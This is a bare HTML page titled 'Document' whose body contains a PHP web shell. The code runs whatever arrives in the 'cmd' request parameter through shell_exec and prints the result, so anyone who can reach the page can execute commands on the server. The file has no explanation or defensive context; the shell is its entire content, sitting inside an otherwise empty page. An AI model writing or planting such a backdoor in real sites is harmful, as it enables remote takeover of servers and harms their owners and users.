
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>

<?php
if (isset($_REQUEST['cmd'])) {
    $cmd = ($_REQUEST["cmd"]);
    $result = shell_exec($cmd);
    echo "<pre>" . $result . "</pre>";
    die;

}?> 
    



</body>
</html>